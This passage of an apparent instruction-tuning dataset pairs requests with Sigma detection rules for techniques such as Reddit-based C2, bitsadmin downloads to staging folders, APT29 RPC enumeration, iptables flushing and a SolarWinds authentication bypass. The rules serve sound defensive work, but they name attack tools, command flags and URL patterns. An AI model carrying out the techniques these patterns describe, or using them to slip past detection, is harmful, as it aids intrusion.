    "instruction": "Build a Sigma rule with the goal of detecting an a non-browser process interacting with the Reddit API which could indicate use of a covert C2 such as RedditC2.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a non-browser process interacting with the Reddit API which could indicate the use of a covert C2 such as RedditC2, you should focus on monitoring network connections on Windows systems, specifically targeting traffic aimed at \"reddit.com\". This involves paying close attention to destination hostnames in network connection logs to catch any that contain references to 'reddit.com', which is a known method for establishing covert communication channels through the Reddit API. \n\nSimultaneously, it's crucial to exclude legitimate browser communications from triggering false alerts. This is achieved by filtering out connections initiated by standard browsers or applications known to interact with Reddit. The rule outlines several conditions to identify and exclude browser-based traffic, including connections by Brave, Chrome, Firefox, Internet Explorer, Maxthon, Edge, Opera, Safari, SeaMonkey, Vivaldi, and Whale browsers, by checking the processes initiating these connections against known default installation paths or by matching the process executables' names. \n\nMaintaining a keen eye for processes that do not fall under these browser or application exclusions can help pinpoint suspicious activities that might be covertly leveraging the Reddit API for command and control purposes. False positives might occur when legitimate applications communicate with the Reddit API and are not included in the exclusion list, so these instances should be carefully considered and vetted. The detection level for this scenario is set to medium, indicating a balanced threshold for alerting.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: network_connection\ndetection:\n    selection:\n        DestinationHostname|contains: 'reddit.com' # Match with Reddit API when you can\n    # Other browsers or apps known to use reddit should be added\n    # TODO: Add full paths for default install locations\n    filter_optional_brave:\n        Image|endswith: '\\brave.exe'\n    filter_optional_chrome:\n        Image:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'\n    filter_optional_firefox:\n        Image:\n            - 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'\n            - 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_maxthon:\n        Image|endswith: '\\maxthon.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_opera:\n        Image|endswith: '\\opera.exe'\n    filter_optional_safari:\n        Image|endswith: '\\safari.exe'\n    filter_optional_seamonkey:\n        Image|endswith: '\\seamonkey.exe'\n    filter_optional_vivaldi:\n        Image|endswith: '\\vivaldi.exe'\n    filter_optional_whale:\n        Image|endswith: '\\whale.exe'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Legitimate applications communicating with the Reddit API e.g. web browsers not in the exclusion list, app with an RSS  etc.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: network_connection\ndetection:\n    selection:\n        DestinationHostname|contains: 'reddit.com' # Match with Reddit API when you can\n    # Other browsers or apps known to use reddit should be added\n    # TODO: Add full paths for default install locations\n    filter_optional_brave:\n        Image|endswith: '\\brave.exe'\n    filter_optional_chrome:\n        Image:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'\n    filter_optional_firefox:\n        Image:\n            - 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'\n            - 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_maxthon:\n        Image|endswith: '\\maxthon.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_opera:\n        Image|endswith: '\\opera.exe'\n    filter_optional_safari:\n        Image|endswith: '\\safari.exe'\n    filter_optional_seamonkey:\n        Image|endswith: '\\seamonkey.exe'\n    filter_optional_vivaldi:\n        Image|endswith: '\\vivaldi.exe'\n    filter_optional_whale:\n        Image|endswith: '\\whale.exe'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Legitimate applications communicating with the Reddit API e.g. web browsers not in the exclusion list, app with an RSS  etc.\nlevel: medium\n",
      "question": "an a non-browser process interacting with the Reddit API which could indicate use of a covert C2 such as RedditC2",
      "answer": "In order to detect a non-browser process interacting with the Reddit API which could indicate the use of a covert C2 such as RedditC2, you should focus on monitoring network connections on Windows systems, specifically targeting traffic aimed at \"reddit.com\". This involves paying close attention to destination hostnames in network connection logs to catch any that contain references to 'reddit.com', which is a known method for establishing covert communication channels through the Reddit API. \n\nSimultaneously, it's crucial to exclude legitimate browser communications from triggering false alerts. This is achieved by filtering out connections initiated by standard browsers or applications known to interact with Reddit. The rule outlines several conditions to identify and exclude browser-based traffic, including connections by Brave, Chrome, Firefox, Internet Explorer, Maxthon, Edge, Opera, Safari, SeaMonkey, Vivaldi, and Whale browsers, by checking the processes initiating these connections against known default installation paths or by matching the process executables' names. \n\nMaintaining a keen eye for processes that do not fall under these browser or application exclusions can help pinpoint suspicious activities that might be covertly leveraging the Reddit API for command and control purposes. False positives might occur when legitimate applications communicate with the Reddit API and are not included in the exclusion list, so these instances should be carefully considered and vetted. The detection level for this scenario is set to medium, indicating a balanced threshold for alerting."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of bitsadmin downloading a file to a suspicious target folder.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of bitsadmin downloading a file to a suspicious target folder, you should: Monitor process creation events on Windows systems for any activity related to the use of the bitsadmin.exe utility. Specifically, look for processes where the image ends with '\\bitsadmin.exe' or where the OriginalFileName is exactly 'bitsadmin.exe'. Furthermore, pay close attention to the command line arguments accompanying these processes. Be on the lookout for command lines that include '/transfer', '/create', or '/addfile' parameters, as these are indicative of bitsadmin being used to manipulate or transfer files. Equally important is to examine the command lines for paths pointing to suspicious folders. Such folders include, but are not limited to, '\\Perflogs', '\\ProgramData\\', '\\Temp\\', '\\Users\\Public\\', '\\Windows\\', '\\AppData\\Local\\Temp\\', '\\AppData\\Roaming\\', '\\Desktop\\', '%ProgramData%', and '%public%'. If all these conditions are met, it likely indicates the misuse of bitsadmin for downloading files to suspicious locations, and such activity should be investigated promptly due to its high-risk nature.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_flags:\n        CommandLine|contains:\n            - ' /transfer '\n            - ' /create '\n            - ' /addfile '\n    selection_folder:\n        CommandLine|contains:\n            - ':\\Perflogs'\n            - ':\\ProgramData\\'\n            - ':\\Temp\\'\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n            - '\\Desktop\\'\n            - '%ProgramData%'\n            - '%public%'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_flags:\n        CommandLine|contains:\n            - ' /transfer '\n            - ' /create '\n            - ' /addfile '\n    selection_folder:\n        CommandLine|contains:\n            - ':\\Perflogs'\n            - ':\\ProgramData\\'\n            - ':\\Temp\\'\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n            - '\\Desktop\\'\n            - '%ProgramData%'\n            - '%public%'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of bitsadmin downloading a file to a suspicious target folder",
      "answer": "In order to detect usage of bitsadmin downloading a file to a suspicious target folder, you should: Monitor process creation events on Windows systems for any activity related to the use of the bitsadmin.exe utility. Specifically, look for processes where the image ends with '\\bitsadmin.exe' or where the OriginalFileName is exactly 'bitsadmin.exe'. Furthermore, pay close attention to the command line arguments accompanying these processes. Be on the lookout for command lines that include '/transfer', '/create', or '/addfile' parameters, as these are indicative of bitsadmin being used to manipulate or transfer files. Equally important is to examine the command lines for paths pointing to suspicious folders. Such folders include, but are not limited to, '\\Perflogs', '\\ProgramData\\', '\\Temp\\', '\\Users\\Public\\', '\\Windows\\', '\\AppData\\Local\\Temp\\', '\\AppData\\Roaming\\', '\\Desktop\\', '%ProgramData%', and '%public%'. If all these conditions are met, it likely indicates the misuse of bitsadmin for downloading files to suspicious locations, and such activity should be investigated promptly due to its high-risk nature."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Domain user and group enumeration via network reconnaissance.\nSeen in APT 29 and other common tactics and actors. set of RPC (remote procedure calls) used to enumerate a domain controller.\nThe rule was created based off the datasets and hackathon from https://github.com/OTRF/detection-hackathon-apt29\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect domain user and group enumeration via network reconnaissance, seen in APT 29 and other common tactics and actors, you should monitor the Zeek logs, specifically focusing on the DCE/RPC service. This service, when leveraged by adversaries, can reveal significant information about the internal structuring and user accounts of a domain through various methods.\n\nLook for security principal names being translated into their SID form or vice versa, which could indicate an attempt to map out users and their permissions. This can be done through operations such as LsarLookupNames3 and LsarLookupSids3, respectively. Additionally, watch for methods like SamrGetGroupsForUser, SamrLookupIdsInDomain, SamrLookupNamesInDomain, SamrQuerySecurityObject, and SamrQueryInformationGroup being called. These methods are crucial for adversaries as they provide listings of groups a user is a member of, translate sets of RIDs into account names or vice versa, query the access control on various objects, and obtain attributes from a group object, all of which could be used to gain further foothold into the network.\n\nIt is critical to gather these logs within a short timeframe, ideally 30 seconds, and aggregate the counts of these operations by source IP. If a single source IP is seen making more than four distinct types of these operations within this timeframe, it could indicate suspicious activity worth investigating further.\n\nBe mindful of potential false positives, such as devices that perform authentication tasks, like VPNs or firewalls that may look up IPs to username for legitimate purposes. Additionally, consider the specific scripts and administrative tools used within your environment, as they might legitimately use these methods for non-malicious purposes.\n\nThis approach aligns with practices to counter activities by advanced persistent threats such as APT 29, by focusing on the detection of a set of remote procedure calls (RPC) used to enumerate a domain controller, reflecting tactics and techniques associated with reconnaissance and initial access phases of an attack.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: zeek\n    service: dce_rpc\ndetection:\n    selection:\n        operation:\n            #- LsarEnumerateTrustedDomains #potentially too many FPs, removing. caused by netlogon\n            #- SamrEnumerateDomainsInSamServer #potentially too many FPs, removing. #method obtains a listing of all domains hosted by the server side of this protocol. This value is a cookie that the server can use to continue an enumeration on a subsequent call\n            - LsarLookupNames3 #method translates a batch of security principal names to their SID form  \n            - LsarLookupSids3 #translates a batch of security principal SIDs to their name forms\n            - SamrGetGroupsForUser #obtains a listing of groups that a user is a member of\n            - SamrLookupIdsInDomain #method translates a set of RIDs into account names\n            - SamrLookupNamesInDomain #method translates a set of account names into a set of RIDs\n            - SamrQuerySecurityObject #method queries the access control on a server, domain, user, group, or alias object\n            - SamrQueryInformationGroup #obtains attributes from a group object\n    timeframe: 30s\n    condition: selection | count(operation) by src_ip > 4\nfalsepositives:\n    - Devices that may do authentication like a VPN or a firewall that looksup IPs to username\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: zeek\n    service: dce_rpc\ndetection:\n    selection:\n        operation:\n            #- LsarEnumerateTrustedDomains #potentially too many FPs, removing. caused by netlogon\n            #- SamrEnumerateDomainsInSamServer #potentially too many FPs, removing. #method obtains a listing of all domains hosted by the server side of this protocol. This value is a cookie that the server can use to continue an enumeration on a subsequent call\n            - LsarLookupNames3 #method translates a batch of security principal names to their SID form  \n            - LsarLookupSids3 #translates a batch of security principal SIDs to their name forms\n            - SamrGetGroupsForUser #obtains a listing of groups that a user is a member of\n            - SamrLookupIdsInDomain #method translates a set of RIDs into account names\n            - SamrLookupNamesInDomain #method translates a set of account names into a set of RIDs\n            - SamrQuerySecurityObject #method queries the access control on a server, domain, user, group, or alias object\n            - SamrQueryInformationGroup #obtains attributes from a group object\n    timeframe: 30s\n    condition: selection | count(operation) by src_ip > 4\nfalsepositives:\n    - Devices that may do authentication like a VPN or a firewall that looksup IPs to username\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n",
      "question": "Domain user and group enumeration via network reconnaissance.\nSeen in APT 29 and other common tactics and actors. set of RPC (remote procedure calls) used to enumerate a domain controller.\nThe rule was created based off the datasets and hackathon from https://github.com/OTRF/detection-hackathon-apt29\n",
      "answer": "In order to detect domain user and group enumeration via network reconnaissance, seen in APT 29 and other common tactics and actors, you should monitor the Zeek logs, specifically focusing on the DCE/RPC service. This service, when leveraged by adversaries, can reveal significant information about the internal structuring and user accounts of a domain through various methods.\n\nLook for security principal names being translated into their SID form or vice versa, which could indicate an attempt to map out users and their permissions. This can be done through operations such as LsarLookupNames3 and LsarLookupSids3, respectively. Additionally, watch for methods like SamrGetGroupsForUser, SamrLookupIdsInDomain, SamrLookupNamesInDomain, SamrQuerySecurityObject, and SamrQueryInformationGroup being called. These methods are crucial for adversaries as they provide listings of groups a user is a member of, translate sets of RIDs into account names or vice versa, query the access control on various objects, and obtain attributes from a group object, all of which could be used to gain further foothold into the network.\n\nIt is critical to gather these logs within a short timeframe, ideally 30 seconds, and aggregate the counts of these operations by source IP. If a single source IP is seen making more than four distinct types of these operations within this timeframe, it could indicate suspicious activity worth investigating further.\n\nBe mindful of potential false positives, such as devices that perform authentication tasks, like VPNs or firewalls that may look up IPs to username for legitimate purposes. Additionally, consider the specific scripts and administrative tools used within your environment, as they might legitimately use these methods for non-malicious purposes.\n\nThis approach aligns with practices to counter activities by advanced persistent threats such as APT 29, by focusing on the detection of a set of remote procedure calls (RPC) used to enumerate a domain controller, reflecting tactics and techniques associated with reconnaissance and initial access phases of an attack."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect use of iptables to flush all firewall rules, tables and chains and allow all network traffic.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect use of iptables to flush all firewall rules, tables and chains and allow all network traffic, you should: monitor Linux systems for the creation of processes that are invoking utilities related to IPTables and UFW. Specifically, look for processes ending with '/iptables', '/xtables-legacy-multi', '/iptables-legacy-multi', '/ip6tables', or '/ip6tables-legacy-multi'. These utilities are significant because they are directly associated with managing Linux firewalls. Focus on commands that contain parameters '-F', '-Z', '-X', which are used to flush all rules, set all chain's packet and byte counters to zero, and delete a chain, respectively. Additionally, monitor for UFW related commands that include 'ufw-logging-deny', 'ufw-logging-allow', 'ufw6-logging-deny', and 'ufw6-logging-allow', which are utilized to configure logging rules in the Uncomplicated Firewall (UFW). Network administrators may perform such activities as part of legitimate management tasks, thus they are considered potential false positives. The detection level is set to medium due to the potential impact and the likelihood of occurrence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection_img:\n        Image|endswith:\n            - '/iptables'\n            - '/xtables-legacy-multi'\n            - '/iptables-legacy-multi'\n            - '/ip6tables'\n            - '/ip6tables-legacy-multi'\n    selection_params:\n        CommandLine|contains:\n            - '-F'\n            - '-Z'\n            - '-X'\n    selection_ufw:\n        CommandLine|contains:\n            - 'ufw-logging-deny'\n            - 'ufw-logging-allow'\n            - 'ufw6-logging-deny'\n            - 'ufw6-logging-allow'\n            #- 'ufw-reject-output'\n            #- 'ufw-track-inputt'\n    condition: all of selection_*\nfalsepositives:\n    - Network administrators\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection_img:\n        Image|endswith:\n            - '/iptables'\n            - '/xtables-legacy-multi'\n            - '/iptables-legacy-multi'\n            - '/ip6tables'\n            - '/ip6tables-legacy-multi'\n    selection_params:\n        CommandLine|contains:\n            - '-F'\n            - '-Z'\n            - '-X'\n    selection_ufw:\n        CommandLine|contains:\n            - 'ufw-logging-deny'\n            - 'ufw-logging-allow'\n            - 'ufw6-logging-deny'\n            - 'ufw6-logging-allow'\n            #- 'ufw-reject-output'\n            #- 'ufw-track-inputt'\n    condition: all of selection_*\nfalsepositives:\n    - Network administrators\nlevel: medium\n",
      "question": "Detect use of iptables to flush all firewall rules, tables and chains and allow all network traffic",
      "answer": "In order to detect use of iptables to flush all firewall rules, tables and chains and allow all network traffic, you should: monitor Linux systems for the creation of processes that are invoking utilities related to IPTables and UFW. Specifically, look for processes ending with '/iptables', '/xtables-legacy-multi', '/iptables-legacy-multi', '/ip6tables', or '/ip6tables-legacy-multi'. These utilities are significant because they are directly associated with managing Linux firewalls. Focus on commands that contain parameters '-F', '-Z', '-X', which are used to flush all rules, set all chain's packet and byte counters to zero, and delete a chain, respectively. Additionally, monitor for UFW related commands that include 'ufw-logging-deny', 'ufw-logging-allow', 'ufw6-logging-deny', and 'ufw6-logging-allow', which are utilized to configure logging rules in the Uncomplicated Firewall (UFW). Network administrators may perform such activities as part of legitimate management tasks, thus they are considered potential false positives. The detection level is set to medium due to the potential impact and the likelihood of occurrence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies the suspicious use of GetSessionToken. Tokens could be created and used by attackers to move laterally and escalate privileges..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify the suspicious use of GetSessionToken, which could be created and used by attackers to move laterally and escalate privileges, you should focus on monitoring AWS CloudTrail logs. Specifically, look out for any use of the `GetSessionToken` action within these logs, which comes from the `eventSource` of `sts.amazonaws.com`. It is crucial to pay attention to the instances where the user identity type involved in making these requests is an `IAMUser`. \n\nRecognizing legitimate from illegitimate use of `GetSessionToken` could be somewhat challenging, as system or network administrators may use this action for routine tasks. To minimize false positives, closely examine whether the user identity, user agent, and/or hostname involved in these actions are expected to perform such operations within your environment. Activities performed by unfamiliar users or from unexpected hosts attempting to get a session token should be investigated thoroughly. Known legitimate behavior that frequently triggers this alert might need to be exempted to avoid unnecessary noise in your monitoring system.\n\nBy keeping an eye on these specific log entries and filtering activities based on the given criteria, you can flag potential security incidents. This proactive approach is based on well-recognized tactics and techniques, including lateral movement and privilege escalation, and aims to safeguard your AWS environment against unauthorized access and potential compromise.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: sts.amazonaws.com\n        eventName: GetSessionToken\n        userIdentity.type: IAMUser\n    condition: selection\nfalsepositives:\n    - GetSessionToken may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. GetSessionToken from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: sts.amazonaws.com\n        eventName: GetSessionToken\n        userIdentity.type: IAMUser\n    condition: selection\nfalsepositives:\n    - GetSessionToken may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. GetSessionToken from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
      "question": "Identifies the suspicious use of GetSessionToken. Tokens could be created and used by attackers to move laterally and escalate privileges.",
      "answer": "In order to identify the suspicious use of GetSessionToken, which could be created and used by attackers to move laterally and escalate privileges, you should focus on monitoring AWS CloudTrail logs. Specifically, look out for any use of the `GetSessionToken` action within these logs, which comes from the `eventSource` of `sts.amazonaws.com`. It is crucial to pay attention to the instances where the user identity type involved in making these requests is an `IAMUser`. \n\nRecognizing legitimate from illegitimate use of `GetSessionToken` could be somewhat challenging, as system or network administrators may use this action for routine tasks. To minimize false positives, closely examine whether the user identity, user agent, and/or hostname involved in these actions are expected to perform such operations within your environment. Activities performed by unfamiliar users or from unexpected hosts attempting to get a session token should be investigated thoroughly. Known legitimate behavior that frequently triggers this alert might need to be exempted to avoid unnecessary noise in your monitoring system.\n\nBy keeping an eye on these specific log entries and filtering activities based on the given criteria, you can flag potential security incidents. This proactive approach is based on well-recognized tactics and techniques, including lateral movement and privilege escalation, and aims to safeguard your AWS environment against unauthorized access and potential compromise."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting CVE-2020-10148 SolarWinds Orion API authentication bypass attempts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect CVE-2020-10148 SolarWinds Orion API authentication bypass attempts, you should focus on monitoring webserver logs for specific patterns in the query strings of URLs. Look for requests containing '/WebResource.axd', '/ScriptResource.axd', '/i18n.ashx', or '/Skipi18n' in their query parameters as these could indicate an attempt to exploit the vulnerability. Additionally, watch for requests that include '/SolarWinds/' or '/api/' in their query strings, as these are also potentially malicious patterns associated with the attack.\n\nHowever, not all requests that match these patterns are indicative of an attack. Exclude from alerts the valid requests that contain 'Orion/Skipi18n/Profiler/' or feature 'css.i18n.ashx' and 'js.i18n.ashx' in the query parameters, since these can be legitimate traffic patterns and might otherwise lead to false positives.\n\nThis approach combines a meticulous selection of potentially malicious query parameters with exclusions for known benign patterns, balancing sensitivity to the attack with a need to minimize unwarranted alerts. The severity of this monitoring is considered critical due to the nature of the vulnerability being exploited.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query|contains:\n            - '/WebResource.axd'\n            - '/ScriptResource.axd'\n            - '/i18n.ashx'\n            - '/Skipi18n'\n    selection2:\n        cs-uri-query|contains:\n            - '/SolarWinds/'\n            - '/api/'\n    valid_request_1:\n        cs-uri-query|contains: 'Orion/Skipi18n/Profiler/'\n    valid_request_2:\n        cs-uri-query|contains:\n            - 'css.i18n.ashx'\n            - 'js.i18n.ashx'\n    condition: all of selection* and not 1 of valid_request_*\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query|contains:\n            - '/WebResource.axd'\n            - '/ScriptResource.axd'\n            - '/i18n.ashx'\n            - '/Skipi18n'\n    selection2:\n        cs-uri-query|contains:\n            - '/SolarWinds/'\n            - '/api/'\n    valid_request_1:\n        cs-uri-query|contains: 'Orion/Skipi18n/Profiler/'\n    valid_request_2:\n        cs-uri-query|contains:\n            - 'css.i18n.ashx'\n            - 'js.i18n.ashx'\n    condition: all of selection* and not 1 of valid_request_*\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "CVE-2020-10148 SolarWinds Orion API authentication bypass attempts",
      "answer": "In order to detect CVE-2020-10148 SolarWinds Orion API authentication bypass attempts, you should focus on monitoring webserver logs for specific patterns in the query strings of URLs. Look for requests containing '/WebResource.axd', '/ScriptResource.axd', '/i18n.ashx', or '/Skipi18n' in their query parameters as these could indicate an attempt to exploit the vulnerability. Additionally, watch for requests that include '/SolarWinds/' or '/api/' in their query strings, as these are also potentially malicious patterns associated with the attack.\n\nHowever, not all requests that match these patterns are indicative of an attack. Exclude from alerts the valid requests that contain 'Orion/Skipi18n/Profiler/' or feature 'css.i18n.ashx' and 'js.i18n.ashx' in the query parameters, since these can be legitimate traffic patterns and might otherwise lead to false positives.\n\nThis approach combines a meticulous selection of potentially malicious query parameters with exclusions for known benign patterns, balancing sensitivity to the attack with a need to minimize unwarranted alerts. The severity of this monitoring is considered critical due to the nature of the vulnerability being exploited."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the Sharp Chisel via the commandline arguments.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the Sharp Chisel via the commandline arguments, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\SharpChisel.exe' or where the product name is identified as 'SharpChisel'. Such an event is indicative of Sharp Chisel's execution. Given the context, this activity is highly suspicious and is unlikely to generate false positives, underlining its significance in identifying potential malicious behavior. The detection of this activity is crucial as it can point towards an attacker using Sharp Chisel for nefarious purposes, which is flagged at a high severity level due to its potential impact.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SharpChisel.exe'\n        - Product: 'SharpChisel'\n    # See rule 8b0e12da-d3c3-49db-bb4f-256703f380e5 for Chisel.exe coverage\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SharpChisel.exe'\n        - Product: 'SharpChisel'\n    # See rule 8b0e12da-d3c3-49db-bb4f-256703f380e5 for Chisel.exe coverage\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "usage of the Sharp Chisel via the commandline arguments",
      "answer": "In order to detect usage of the Sharp Chisel via the commandline arguments, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\SharpChisel.exe' or where the product name is identified as 'SharpChisel'. Such an event is indicative of Sharp Chisel's execution. Given the context, this activity is highly suspicious and is unlikely to generate false positives, underlining its significance in identifying potential malicious behavior. The detection of this activity is crucial as it can point towards an attacker using Sharp Chisel for nefarious purposes, which is flagged at a high severity level due to its potential impact."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a new Outlook form which can contain malicious code.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a new Outlook form which can contain malicious code, you should: Monitor Windows file events for activities involving the Outlook application. Specifically, look for instances where files are being created or modified in directories related to Outlook forms, such as '\\AppData\\Local\\Microsoft\\FORMS\\IPM' for modern Windows systems and '\\Local Settings\\Application Data\\Microsoft\\Forms' for Windows XP. The process associated with these actions is expected to be 'outlook.exe'. It's important to note that there might be legitimate reasons for the creation of new Outlook forms; thus, validating these actions against known business practices is advisable to reduce false positives. This monitoring activity is crucial for identifying potential exploitation attempts aiming to run malicious code through Outlook forms, aligning with tactics and techniques related to initial access and execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '\\outlook.exe'\n        TargetFilename|contains:\n            - '\\AppData\\Local\\Microsoft\\FORMS\\IPM'\n            - '\\Local Settings\\Application Data\\Microsoft\\Forms' # Windows XP\n    condition: selection\nfalsepositives:\n    - Legitimate use of outlook forms\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '\\outlook.exe'\n        TargetFilename|contains:\n            - '\\AppData\\Local\\Microsoft\\FORMS\\IPM'\n            - '\\Local Settings\\Application Data\\Microsoft\\Forms' # Windows XP\n    condition: selection\nfalsepositives:\n    - Legitimate use of outlook forms\nlevel: high\n",
      "question": "creation of a new Outlook form which can contain malicious code",
      "answer": "In order to detect the creation of a new Outlook form which can contain malicious code, you should: Monitor Windows file events for activities involving the Outlook application. Specifically, look for instances where files are being created or modified in directories related to Outlook forms, such as '\\AppData\\Local\\Microsoft\\FORMS\\IPM' for modern Windows systems and '\\Local Settings\\Application Data\\Microsoft\\Forms' for Windows XP. The process associated with these actions is expected to be 'outlook.exe'. It's important to note that there might be legitimate reasons for the creation of new Outlook forms; thus, validating these actions against known business practices is advisable to reduce false positives. This monitoring activity is crucial for identifying potential exploitation attempts aiming to run malicious code through Outlook forms, aligning with tactics and techniques related to initial access and execution."
    }
  },
  {
